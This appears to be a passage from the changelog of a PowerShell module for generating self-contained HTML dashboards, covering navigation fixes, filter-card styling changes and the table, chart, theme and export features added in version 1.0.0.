- **Two-tier nav — group tabs hidden behind tall header on scroll**: The sticky nav `top` offset was hardcoded to `calc(var(--header-height) + 8px)` (84 px), but the actual rendered header is taller when InfoFields are present. `syncNavTop()` now measures `header.offsetHeight` at runtime and sets `nav.style.top` dynamically (also wired to `window resize`), so the full nav bar (group tabs + subnav strip) is always visible below the header when scrolling.

## [1.1.0] — 2026-04-14

### Fixed
- **Two-tier nav — blocks hidden when group has no matching table**: `Export-DhDashboard` now collects `NavGroup` values from blocks as well as tables when building the group-tab list. Previously, a filter card, bar chart, html block, or collapsible section that used `-NavGroup` but had no table in the same group would generate a hidden `block-section` with no reachable group tab.
- **Two-tier nav — empty subnav strip for block-only groups**: When the active group contains blocks but no table sub-links, the subnav strip is now hidden automatically by JS. This avoids an awkward empty second bar.
- **Flat nav — ungrouped blocks hidden on first panel click**: `showPanel` in flat-nav mode previously cleared `panel-active` from *all* `.block-section` elements, including those with no `data-navgroup` attribute that are meant to always be visible. Now only grouped block-sections (those with `data-navgroup`) are toggled by panel navigation.

### Changed
- **Filter card design** — cards are now more compact: reduced padding (`5px 10px`), border reduced from 2 px to 1 px, border-radius reduced to `radius-sm`, min-width reduced from 110 px to 80 px, name font-size reduced to `size-xs`. Active state now shows a 2 px box-shadow ring instead of only a background fill. Section heading reduced from `size-md` to `size-sm` and its bottom margin halved.

## [1.0.0] — 2026-04-12

### Added
- `New-DhDashboard` — create a dashboard object with title, subtitle, logo, theme, nav title, info fields
- `Add-DhTable` — sortable, filterable, pageable data tables with:
  - Column types: text, progressbar, badge
  - Formatting: number, currency, bytes, percent, datetime, duration
  - Column options: Bold, Italic, Font (mono/ui/display), Align, Width, PinFirst
  - Footer aggregates: sum, avg, min, max, count
  - Threshold colouring: numeric (Min/Max) and string (Value) rules
  - Row highlighting driven by threshold match
  - Embedded pie charts (multiple per table)
  - Multi-row checkbox selection
  - Custom export filename for CSV/XLSX/PDF downloads
  - Two-tier navigation via `-NavGroup`
- `Set-DhTableLink` — master/detail table linking with click-to-filter; chainable (A→B→C)
- `Add-DhSummary` — KPI metric tiles with icon, value, label, class, and format support
- `Add-DhBarChart` — horizontal proportional bar chart with optional click-to-filter
- `Add-DhFilterCard` — clickable card grid filter (single-select and multi-select)
- `Add-DhHtmlBlock` — free-form HTML panel in five styles: info, warn, danger, ok, neutral
- `Add-DhCollapsible` — collapsible section with card-grid or free-form HTML content
- `Export-DhDashboard` — write a self-contained HTML file with all CSS, JS, and data embedded
- `Get-DhTheme` — list or inspect built-in theme families; save CSS to disk
- Five built-in theme families: Default, Azure, VMware, Grey, Company
  - Each family embeds both light and dark variants; runtime toggle button in nav bar
- Two-tier navigation: flat nav bar or grouped primary-tabs + subnav strip
- Client-side export: CSV (no CDN), XLSX and PDF (cdnjs)
- Light/dark theme toggle with both variants always embedded in the HTML output
